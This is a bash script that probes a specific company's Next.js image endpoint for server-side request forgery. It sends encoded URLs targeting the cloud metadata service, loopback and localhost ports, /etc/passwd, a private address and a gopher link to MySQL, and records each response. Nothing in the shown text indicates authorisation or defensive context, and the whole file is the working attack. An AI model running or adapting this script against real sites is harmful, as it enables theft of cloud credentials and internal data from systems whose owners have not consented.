#!/bin/bash
T="https://www.infinitycapital.bh/_next/image"
D=$(dirname "$0")
probe () {
  local name="$1" enc="$2"
  code=$(curl -sk --globoff -o "$D/p_$name.bin" -w '%{http_code}' "$T?url=$enc&w=64&q=75")
  sz=$(stat -c%s "$D/p_$name.bin" 2>/dev/null)
  printf '%-10s code=%s size=%s body=%s\n' "$name" "$code" "$sz" "$(head -c 140 "$D/p_$name.bin" | tr -d '\0\n')"
  sleep 1
}
probe imds   "http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
probe loopb  "http%3A%2F%2F127.0.0.1%3A3000%2F"
probe localh "http%3A%2F%2Flocalhost%3A3000%2F"
probe passwd "file%3A%2F%2F%2Fetc%2Fpasswd"
probe priv   "http%3A%2F%2F10.0.0.1%2F"
probe gopher "gopher%3A%2F%2F127.0.0.1%3A3306%2F"